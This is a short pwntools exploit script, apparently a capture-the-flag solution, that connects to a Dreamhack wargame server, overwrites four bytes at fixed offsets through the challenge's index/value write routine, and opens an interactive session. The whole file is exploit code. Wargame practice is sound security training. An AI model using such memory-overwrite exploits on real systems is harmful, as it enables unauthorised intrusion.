from pwn import *

HOST, PORT = '0.0.0.0', 31338
HOST, PORT = 'host3.dreamhack.games', 22714
r = remote(HOST, PORT)

def write(idx, val):
    r.sendline(b'%d'%idx)
    r.sendlineafter(b': ', b'%d'%val)

r.recvuntil(b': ')
write(0x324, 0x8e)
write(0x326, 0xbf)
write(0x327, 0xfe)
write(0x323, 0x75)

r.interactive()